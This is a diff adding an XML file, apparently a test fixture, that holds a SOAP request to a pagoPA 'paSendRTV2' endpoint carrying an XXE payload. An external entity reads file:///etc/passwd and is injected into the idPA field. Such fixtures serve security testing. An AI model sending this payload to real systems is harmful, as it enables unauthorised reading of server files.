@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE soapenv:Envelope [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Body>
+    <paSendRTV2Request xmlns="http://pagopa-api.pagopa.gov.it/pa/paForNode.xsd">
+      <idPA>&xxe;</idPA>
+    </paSendRTV2Request>
+  </soapenv:Body>
+</soapenv:Envelope>
